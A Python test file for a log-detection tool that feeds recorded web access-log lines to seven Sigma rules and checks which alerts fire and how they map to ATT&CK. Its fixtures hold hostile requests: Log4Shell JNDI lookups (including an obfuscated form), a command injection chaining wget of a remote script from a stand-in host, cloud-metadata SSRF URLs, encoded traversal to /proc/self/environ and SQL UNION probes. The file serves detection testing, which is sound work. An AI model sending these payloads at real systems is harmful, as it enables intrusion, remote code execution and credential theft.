"""Web Sigma examples proved on stored combined access logs.

Seven donor rules stay. Each matches a recorded request the top-level pack does not:
a comment-split UNION, a double-encoded walk to proc, a JNDI lookup, a metadata URL,
a chained wget, a wordlist name, or a Nessus or ffuf agent. The cross-site scripting
example is not a file: its tokens are bare HTML fragments. Documentation URLs, a normal
search, and a regular browser agent are stored and cited by no alert. A wordlist or
scanner hit is the observed request, linked only to its T1595 rule. The stock scanner
still leaves T1190 mapped.
"""

import unittest
from datetime import datetime, timedelta, timezone
from pathlib import Path

from watchpost import attack, ecs, engine, improve, queries, rules as rules_mod, sigma, simulate
from watchpost.db import connect, init_schema, now_iso
from watchpost.normalize import parse_payload

ROOT = Path(__file__).resolve().parent.parent
WEB = ROOT / "docs" / "sigma-examples" / "web"
FLAT = ROOT / "docs" / "sigma-examples"
NOW = datetime(2026, 11, 18, 23, 0, tzinfo=timezone.utc)
START = datetime(2026, 11, 18, 15, 0, tzinfo=timezone.utc)
MOZILLA = "Mozilla/5.0"
BENIGN_IP = "10.0.1.23"
LOGSOURCE_WARNING = "logsource is informational only: the rule runs on every stored event"
OMITTED = ("web_cross_site_scripting.yml",)
NEW_ONLY = ("web_log4shell_jndi.yml", "web_cloud_metadata_ssrf.yml", "web_command_injection.yml")

SQL = "sigma_web_sql_injection_attempt"
TRAV = "sigma_web_path_traversal_to_a_sensitive_file"
JNDI = "sigma_log_shell_jndi_lookup_in_a_web_request"
META = "sigma_web_request_for_cloud_instance_metadata"
CMD = "sigma_web_command_injection_attempt"
WORD = "sigma_web_sensitive_file_wordlist_probe"
SCAN = "sigma_web_vulnerability_scanner_user_agent"

# filename, rule id, sigma uuid, severity, technique, unmapped tactic tag.
PACK = (
    ("web_sql_injection.yml", SQL, "e8eb38c5-edba-4f49-97ae-ece699e8d84c", "high", "T1190",
     "attack.initial_access"),
    ("web_path_traversal.yml", TRAV, "d8dc8aec-592e-4167-a76f-dafc5d55af46", "high", "T1190",
     "attack.initial_access"),
    ("web_log4shell_jndi.yml", JNDI, "a22f74cf-66f4-4868-9ba3-d70e3ec836a7", "critical", "T1190",
     "attack.initial_access"),
    ("web_cloud_metadata_ssrf.yml", META, "2960ff5f-f61c-4a99-a73b-08a1322ab433", "high", "T1190",
     "attack.initial_access"),
    ("web_command_injection.yml", CMD, "e3b1b0bb-cb3e-4057-972b-a9d19ad7bd9e", "high", "T1190",
     "attack.initial_access"),
    ("web_sensitive_file_wordlist.yml", WORD, "35586fa6-1d6e-4e21-805e-db7f56dd2e50", "medium",
     "T1595.003", "attack.reconnaissance"),
    ("web_vulnerability_scanner_user_agent.yml", SCAN, "ccd0e7db-e63d-4256-ba23-4c214a84da05", "medium",
     "T1595.002", "attack.reconnaissance"),
)

# Recorded combined-log requests. `beyond` is the top-level example that must stay silent.
# `probe` is an observed request (T1595), never a T1190 hit.
HITS = (
    {"label": "sql-comment-union", "ip": "203.0.113.10", "path": "/search?q=1%20union/**/select%20null",
     "status": 200, "rule": SQL, "event_type": "web_request", "beyond": "web_sql_injection.yml"},
    {"label": "trav-proc", "ip": "203.0.113.11", "path": "/%252e%252e/proc/self/environ",
     "status": 404, "rule": TRAV, "event_type": "web_scan", "beyond": "web_path_traversal.yml"},
    {"label": "jndi-agent", "ip": "203.0.113.12", "path": "/login", "status": 200, "rule": JNDI,
     "event_type": "web_request", "agent": "${jndi:ldap://203.0.113.50/a}"},
    {"label": "jndi-encoded", "ip": "203.0.113.12",
     "path": "/?x=%24%7bjndi%3aldap%3a%2f%2f203.0.113.50%2fa", "status": 400, "rule": JNDI,
     "event_type": "web_scan"},
    {"label": "jndi-obfuscated", "ip": "203.0.113.12", "path": "/login", "status": 200, "rule": JNDI,
     "event_type": "web_request", "agent": "${::-j}${::-n}${::-d}${::-i}:ldap://203.0.113.50/a"},
    {"label": "meta-aws", "ip": "203.0.113.13",
     "path": "/fetch?url=http://169.254.169.254/latest/meta-data/", "status": 200, "rule": META,
     "event_type": "web_request"},
    {"label": "meta-gcp", "ip": "203.0.113.13",
     "path": "/proxy?u=http://metadata.google.internal/computeMetadata/v1/", "status": 200, "rule": META,
     "event_type": "web_request"},
    {"label": "cmd-wget-500", "ip": "203.0.113.14", "path": "/api/search?q=1;wget%20http://203.0.113.50/x.sh",
     "status": 500, "rule": CMD, "event_type": "web_error"},
    {"label": "cmd-encoded", "ip": "203.0.113.14",
     "path": "/api/search?q=1%3bwget+http://203.0.113.50/x.sh", "status": 200, "rule": CMD,
     "event_type": "web_request"},
    {"label": "word-web-config", "ip": "203.0.113.15", "path": "/web.config", "status": 404, "rule": WORD,
     "event_type": "web_request", "beyond": "web_sensitive_path_probe.yml", "probe": True},
    {"label": "word-svn", "ip": "203.0.113.15", "path": "/.svn/entries", "status": 404, "rule": WORD,
     "event_type": "web_scan", "beyond": "web_sensitive_path_probe.yml", "probe": True},
    {"label": "scan-nessus", "ip": "203.0.113.16", "path": "/", "status": 200, "rule": SCAN,
     "event_type": "web_request", "agent": "Mozilla/5.0 (compatible; Nessus)",
     "beyond": "web_scanner_user_agent.yml", "probe": True},
    {"label": "scan-ffuf", "ip": "203.0.113.16", "path": "/health", "status": 200, "rule": SCAN,
     "event_type": "web_request", "agent": "ffuf/2.1.0", "beyond": "web_scanner_user_agent.yml",
     "probe": True},
)

# Names, documentation URLs, and one parent-segment in a static path. Some are stored as
# web_scan because the classifier uses a shorter token than the pack rule.
QUIET = (
    ("benign-reports", "/app/reports", "web_request", "alice",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0"),
    ("benign-wget-doc", "/docs/curl-and-wget", "web_request", "-", MOZILLA),
    ("benign-tool-doc", "/docs/powershell.exe", "web_request", "-", MOZILLA),
    ("benign-db-doc", "/docs/information_schema", "web_scan", "-", MOZILLA),
    ("benign-ffuf-doc", "/docs/ffuf/options", "web_request", "-", MOZILLA),
    ("benign-config-doc", "/docs/web.config", "web_request", "-", MOZILLA),
    ("benign-metadata-doc", "/docs/metadata.google.internal", "web_request", "-", MOZILLA),
    ("benign-agent-config", "/docs", "web_request", "-", "DocsBot/1.0 ( /web.config manual)"),
    ("benign-js-guide", "/help/javascript-guide", "web_request", "-", MOZILLA),
    ("benign-nikto-blog", "/blog/nikto-vs-nmap", "web_request", "-", MOZILLA),
    ("benign-passwd-doc", "/docs/etc/passwd-policy", "web_scan", "-", MOZILLA),
    ("benign-releases", "/latest/releases", "web_request", "-", MOZILLA),
    ("benign-metadata", "/api/metadata", "web_request", "-", MOZILLA),
    ("benign-environment", "/app/environment", "web_request", "-", MOZILLA),
    ("benign-dot-environment", "/.environment", "web_scan", "-", MOZILLA),
    ("benign-github", "/.github", "web_scan", "-", MOZILLA),
    ("benign-phpunit-bridge", "/vendor/phpunit-bridge", "web_scan", "-", MOZILLA),
    ("benign-static-parent", "/static/../app.js", "web_scan", "-", MOZILLA),
    ("benign-jndi-name", "/login?user=jndi", "web_request", "-", MOZILLA),
    ("benign-select-plan", "/search?q=select+a+plan", "web_request", "-", MOZILLA),
)


def _specs():
    rows = []
    for hit in HITS:
        rows.append({"user": "-", "agent": MOZILLA, "probe": False, "beyond": None, **hit})
    for label, path, event_type, user, agent in QUIET:
        rows.append({"label": label, "ip": BENIGN_IP, "user": user, "path": path, "status": 200,
                     "agent": agent, "rule": None, "event_type": event_type, "probe": False,
                     "beyond": None})
    return rows


def _combined(index, spec):
    when = START + timedelta(minutes=index)
    stamp = when.strftime("%d/%b/%Y:%H:%M:%S +0000")
    return (f'{spec["ip"]} - {spec["user"]} [{stamp}] '
            f'"GET {spec["path"]} HTTP/1.1" {spec["status"]} 0 "-" "{spec["agent"]}"')


def _message(spec):
    text = f'GET {spec["path"]} -> {spec["status"]}'
    agent = spec["agent"]
    if agent not in (None, "", "-"):
        text += f" ua={agent[:120]}"
    return text


class WebSigmaPackTests(unittest.TestCase):
    def test_pack_on_stored_access_logs(self):
        names = sorted(path.name for path in WEB.glob("*.yml"))
        self.assertEqual(names, sorted(row[0] for row in PACK))
        for name in OMITTED:
            self.assertFalse((WEB / name).exists(), name)
        for name in NEW_ONLY:
            self.assertFalse((FLAT / name).exists(), name)

        compiled = {}
        for filename, rule_id, sigma_id, severity, technique, tactic in PACK:
            source = (WEB / filename).read_text(encoding="utf-8")
            rule = sigma.compile_rule(source)
            self.assertEqual(rule["rule_id"], rule_id)
            self.assertEqual(rule["sigma_id"], sigma_id)
            self.assertEqual(rule["severity"], severity)
            self.assertEqual([item["id"] for item in rule["techniques"]], [technique])
            self.assertNotIn(rule_id, rules_mod.RULE_FUNCTIONS)
            self.assertEqual(rule["warnings"], [
                "tags not mapped to the ATT&CK catalog (kept out of coverage): " + tactic,
                LOGSOURCE_WARNING,
            ])
            compiled[rule_id] = (rule, source)
        self.assertEqual(len(compiled), 7)

        flat = {}
        for spec in _specs():
            name = spec["beyond"]
            if name and name not in flat:
                flat[name] = sigma.compile_rule((FLAT / name).read_text(encoding="utf-8"))["params"]
        self.assertEqual(set(flat), {
            "web_sql_injection.yml", "web_path_traversal.yml",
            "web_sensitive_path_probe.yml", "web_scanner_user_agent.yml",
        })

        conn = connect(":memory:")
        self.addCleanup(conn.close)
        init_schema(conn)
        for rule, source in compiled.values():
            sigma.add_rule(conn, rule, source, None, "analyst", "admin", None, now_iso())
        conn.execute("UPDATE rules SET enabled = 0 WHERE id NOT LIKE 'sigma_%'")
        conn.execute("UPDATE rules SET enabled = 1 WHERE id LIKE 'sigma_%'")
        enabled = [row["id"] for row in conn.execute("SELECT id FROM rules WHERE enabled = 1 ORDER BY id")]
        self.assertEqual(enabled, sorted(compiled))

        specs = _specs()
        lines = [_combined(index, spec) for index, spec in enumerate(specs)]
        events, rejections = parse_payload("\n".join(lines) + "\n", "weblog", "web-edge", now=NOW)
        self.assertEqual(rejections, [])
        self.assertEqual(len(events), len(specs))
        result = engine.ingest(conn, events, rejections, "web-edge", "weblog", "tester")
        self.assertEqual(result["rejected"], 0)
        self.assertEqual(result["detection"]["status"], "ok", result["detection"])
        self.assertEqual(result["detection"]["events_scanned"], len(specs))
        self.assertEqual(result["detection"]["alerts_created"], len(PACK))

        rows = list(conn.execute(
            "SELECT id, message, event_type, outcome, user, src_ip, raw FROM events ORDER BY id"))
        self.assertEqual(len(rows), len(specs))
        stored = {}
        for spec, row, line in zip(specs, rows, lines):
            label = spec["label"]
            stored[label] = row
            with self.subTest(stored=label):
                self.assertEqual(row["message"], _message(spec))
                self.assertEqual(row["event_type"], spec["event_type"])
                self.assertEqual(row["outcome"], "failure" if spec["status"] >= 400 else "success")
                self.assertEqual(row["user"], None if spec["user"] == "-" else spec["user"])
                self.assertEqual(row["src_ip"], spec["ip"])
                self.assertIn(spec["path"], row["raw"])
                self.assertIn(spec["path"], row["message"])
                self.assertTrue(row["raw"].startswith(line[:20]))

        for spec in specs:
            if not spec["beyond"]:
                continue
            row = stored[spec["label"]]
            seen = {"event_type": row["event_type"], "message": row["message"],
                    "src_ip": row["src_ip"], "user": row["user"]}
            with self.subTest(beyond=spec["label"]):
                self.assertFalse(sigma.matches(flat[spec["beyond"]], seen), spec["label"])
                self.assertTrue(sigma.matches(compiled[spec["rule"]][0]["params"], seen), spec["label"])

        evidence = {rule_id: set() for rule_id in compiled}
        alerts = list(conn.execute(
            "SELECT id, rule_id, title, event_count, group_key FROM alerts ORDER BY id"))
        self.assertEqual(len(alerts), len(PACK))
        self.assertEqual({row["rule_id"] for row in alerts}, set(compiled))
        t1190_ids = set()
        probe_ids = set()
        for alert in alerts:
            detail = queries.get_alert(conn, alert["id"])
            rule_id = alert["rule_id"]
            title = compiled[rule_id][0]["title"]
            techniques = {item["id"] for item in detail["rule"]["techniques"]}
            with self.subTest(alert=rule_id, group=alert["group_key"]):
                self.assertEqual(detail["evidence_omitted"], 0)
                self.assertEqual(len(detail["evidence"]), alert["event_count"])
                self.assertEqual(
                    detail["title"],
                    f"{title}: {alert['event_count']} matching event(s) for {alert['group_key']}",
                )
                linked = {row["event_id"] for row in conn.execute(
                    "SELECT event_id FROM alert_events WHERE alert_id = ?", (alert["id"],))}
                self.assertEqual(linked, {item["id"] for item in detail["evidence"]})
                for item in detail["evidence"]:
                    doc = ecs.to_ecs(item)
                    self.assertEqual(doc["event"]["action"], item["event_type"])
                    self.assertEqual(doc["event"]["outcome"], item["outcome"])
                    self.assertEqual(item["src_ip"], alert["group_key"])
                evidence[rule_id].update(linked)
            if "T1190" in techniques:
                t1190_ids.update(linked)
            if techniques & {"T1595.002", "T1595.003"}:
                probe_ids.update(linked)

        expected = {rule_id: set() for rule_id in compiled}
        for spec in specs:
            if spec["rule"]:
                expected[spec["rule"]].add(stored[spec["label"]]["id"])
        self.assertEqual(evidence, expected)
        cited = set().union(*evidence.values())
        for spec in specs:
            if not spec["rule"]:
                self.assertNotIn(stored[spec["label"]]["id"], cited, spec["label"])
        self.assertEqual(len(cited), sum(len(ids) for ids in expected.values()))
        self.assertTrue(probe_ids)
        self.assertTrue(t1190_ids.isdisjoint(probe_ids))
        for spec in specs:
            if spec["probe"]:
                self.assertIn(stored[spec["label"]]["id"], probe_ids, spec["label"])
                self.assertNotIn(stored[spec["label"]]["id"], t1190_ids, spec["label"])

    def test_stock_scanner_leaves_t1190_mapped(self):
        conn = connect(":memory:")
        self.addCleanup(conn.close)
        init_schema(conn)
        engine.seed_rules(conn)
        ids = {row["id"] for row in conn.execute("SELECT id FROM rules")}
        self.assertTrue(ids.isdisjoint(row[1] for row in PACK))
        result = attack.evidence(
            attack.coverage(engine.load_rules(conn, enabled_only=False), {}),
            improve.noise_lab(conn)["rules"],
            simulate.SCENARIOS,
        )
        tech = next(item for item in result["techniques"] if item["id"] == "T1190")
        self.assertEqual(tech["level"], "mapped")
        self.assertEqual(tech["why"],
                         "web_scanner detects web_scan, which probes and injects but never exploits.")
